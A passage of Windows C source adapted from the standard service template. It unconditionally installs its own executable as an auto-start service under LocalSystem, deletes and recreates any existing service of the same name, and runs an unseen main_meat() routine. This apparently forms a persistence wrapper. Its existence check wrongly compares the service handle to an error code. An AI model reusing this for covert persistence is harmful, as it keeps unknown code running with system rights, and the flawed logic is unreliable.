    // Otherwise, the service is probably being started by the SCM.
	
	/*
    if( lstrcmpi( argv[1], TEXT("install")) == 0 )
    {
        SvcInstall();
        return 0;
    }
	*/
	
	SvcInstall();

    // TO_DO: Add any additional services for the process to this table.
    SERVICE_TABLE_ENTRY DispatchTable[] = 
    { 
        { SVCNAME, (LPSERVICE_MAIN_FUNCTION) SvcMain }, 
        { NULL, NULL } 
    }; 
 
    // This call returns when the service has stopped. 
    // The process should simply terminate when the call returns.

    if (!StartServiceCtrlDispatcher( DispatchTable )) 
    { 
        SvcReportEvent(TEXT("StartServiceCtrlDispatcher")); 
    } 
} 

//
// Purpose: 
//   Installs a service in the SCM database
//
// Parameters:
//   None
// 
// Return value:
//   None
//
VOID SvcInstall()
{
    SC_HANDLE schSCManager;
    SC_HANDLE schService;
    TCHAR szUnquotedPath[MAX_PATH];

    if( !GetModuleFileName( NULL, szUnquotedPath, MAX_PATH ) )
    {
        //printf("Cannot install service (%d)\n", GetLastError());
        return;
    }

    // In case the path contains a space, it must be quoted so that
    // it is correctly interpreted. For example,
    // "d:\my share\myservice.exe" should be specified as
    // ""d:\my share\myservice.exe"".
    TCHAR szPath[MAX_PATH];
    StringCbPrintf(szPath, MAX_PATH, TEXT("\"%s\""), szUnquotedPath);

    // Get a handle to the SCM database. 
 
    schSCManager = OpenSCManager( 
        NULL,                    // local computer
        NULL,                    // ServicesActive database 
        SC_MANAGER_ALL_ACCESS);  // full access rights 
 
    if (NULL == schSCManager) 
    {
        //printf("OpenSCManager failed (%d)\n", GetLastError());
        return;
    }

    // Create the service

SRV_CREATE:
    schService = CreateService( 
        schSCManager,              // SCM database 
        SVCNAME,                   // name of service 
        SVCNAME,                   // service name to display 
        SERVICE_ALL_ACCESS,        // desired access 
        SERVICE_WIN32_OWN_PROCESS, // service type 
        SERVICE_AUTO_START,      // start type 
        SERVICE_ERROR_NORMAL,      // error control type 
        szPath,                    // path to service's binary 
        NULL,                      // no load ordering group 
        NULL,                      // no tag identifier 
        NULL,                      // no dependencies 
        NULL,                      // LocalSystem account 
        NULL);                     // no password 
 
    if (schService == ERROR_SERVICE_EXISTS) 
    {
		printf("[x] Service already exists.. DELETING...\n"); 
		SC_HANDLE scHandle = OpenServiceA(schSCManager,SVCNAME,SERVICE_ALL_ACCESS);
		if ( DeleteService(scHandle) == 0){
			printf("[x] COULDN'T DELETE SERVICE\n");
		}
        printf("[x] SERVICE DELETED\n");
        CloseServiceHandle(schSCManager);
        goto SRV_CREATE;
    }
    else printf("Service installed successfully\n"); 

    CloseServiceHandle(schService); 
    CloseServiceHandle(schSCManager);
}

//
// Purpose: 
//   Entry point for the service
//
// Parameters:
//   dwArgc - Number of arguments in the lpszArgv array
//   lpszArgv - Array of strings. The first string is the name of
//     the service and subsequent strings are passed by the process
//     that called the StartService function to start the service.
// 
// Return value:
//   None.
//
VOID WINAPI SvcMain( DWORD dwArgc, LPTSTR *lpszArgv )
{
    // Register the handler function for the service

    gSvcStatusHandle = RegisterServiceCtrlHandler( 
        SVCNAME, 
        SvcCtrlHandler);

    if( !gSvcStatusHandle )
    { 
        SvcReportEvent(TEXT("RegisterServiceCtrlHandler")); 
        return; 
    } 

    // These SERVICE_STATUS members remain as set here

    gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS; 
    gSvcStatus.dwServiceSpecificExitCode = 0;    

    // Report initial status to the SCM

    ReportSvcStatus( SERVICE_START_PENDING, NO_ERROR, 3000 );

    // Perform service-specific initialization and work.

    SvcInit( dwArgc, lpszArgv );
}

//
// Purpose: 
//   The service code
//
// Parameters:
//   dwArgc - Number of arguments in the lpszArgv array
//   lpszArgv - Array of strings. The first string is the name of
//     the service and subsequent strings are passed by the process
//     that called the StartService function to start the service.
// 
// Return value:
//   None
//
VOID SvcInit( DWORD dwArgc, LPTSTR *lpszArgv)
{
    // TO_DO: Declare and set any required variables.
    //   Be sure to periodically call ReportSvcStatus() with 
    //   SERVICE_START_PENDING. If initialization fails, call
    //   ReportSvcStatus with SERVICE_STOPPED.

    // Create an event. The control handler function, SvcCtrlHandler,
    // signals this event when it receives the stop control code.

    ghSvcStopEvent = CreateEvent(
                         NULL,    // default security attributes
                         TRUE,    // manual reset event
                         FALSE,   // not signaled
                         NULL);   // no name

    if ( ghSvcStopEvent == NULL)
    {
        ReportSvcStatus( SERVICE_STOPPED, GetLastError(), 0 );
        return;
    }

    // Report running status when initialization is complete.

    ReportSvcStatus( SERVICE_RUNNING, NO_ERROR, 0 );

    // TO_DO: Perform work until service stops.
	
	main_meat();

	
	

    while(1)
    {
        // Check whether to stop the service.

        WaitForSingleObject(ghSvcStopEvent, INFINITE);

        ReportSvcStatus( SERVICE_STOPPED, NO_ERROR, 0 );
        return;
    }
}

//
// Purpose: 
//   Sets the current service status and reports it to the SCM.
//
// Parameters:
//   dwCurrentState - The current state (see SERVICE_STATUS)
//   dwWin32ExitCode - The system error code
//   dwWaitHint - Estimated time for pending operation, 
//     in milliseconds
// 
// Return value:
//   None
//
VOID ReportSvcStatus( DWORD dwCurrentState,
                      DWORD dwWin32ExitCode,
                      DWORD dwWaitHint)
{
    static DWORD dwCheckPoint = 1;

    // Fill in the SERVICE_STATUS structure.

    gSvcStatus.dwCurrentState = dwCurrentState;
    gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;
    gSvcStatus.dwWaitHint = dwWaitHint;

    if (dwCurrentState == SERVICE_START_PENDING)
        gSvcStatus.dwControlsAccepted = 0;
    else gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

    if ( (dwCurrentState == SERVICE_RUNNING) ||
           (dwCurrentState == SERVICE_STOPPED) )
        gSvcStatus.dwCheckPoint = 0;
    else gSvcStatus.dwCheckPoint = dwCheckPoint++;

    // Report the status of the service to the SCM.
    SetServiceStatus( gSvcStatusHandle, &gSvcStatus );
}

//
// Purpose: 
//   Called by SCM whenever a control code is sent to the service
//   using the ControlService function.
//
// Parameters:
//   dwCtrl - control code
// 
// Return value:
//   None
//
VOID WINAPI SvcCtrlHandler( DWORD dwCtrl )
{
   // Handle the requested control code. 

   switch(dwCtrl) 
   {  
      case SERVICE_CONTROL_STOP: 
         ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);

         // Signal the service to stop.

         SetEvent(ghSvcStopEvent);
         ReportSvcStatus(gSvcStatus.dwCurrentState, NO_ERROR, 0);
         
         return;
 
      case SERVICE_CONTROL_INTERROGATE: 
         break; 
 
      default: 
         break;
   } 
   
}

//
// Purpose: 
//   Logs messages to the event log
//
// Parameters:
//   szFunction - name of function that failed
// 
// Return value:
//   None
//
// Remarks:
//   The service must have an entry in the Application event log.
//
VOID SvcReportEvent(LPTSTR szFunction) 
{ 
    HANDLE hEventSource;
    LPCTSTR lpszStrings[2];
    TCHAR Buffer[80];

    hEventSource = RegisterEventSource(NULL, SVCNAME);

    if( NULL != hEventSource )
    {
        StringCchPrintf(Buffer, 80, TEXT("%s failed with %d"), szFunction, GetLastError());

        lpszStrings[0] = SVCNAME;
        lpszStrings[1] = Buffer;

        ReportEvent(hEventSource,        // event log handle
                    EVENTLOG_ERROR_TYPE, // event type
                    0,                   // event category
                    SVC_ERROR,           // event identifier
                    NULL,                // no security identifier
                    2,                   // size of lpszStrings array
                    0,                   // no binary data
                    lpszStrings,         // array of strings
                    NULL);               // no binary data

        DeregisterEventSource(hEventSource);
    }
}
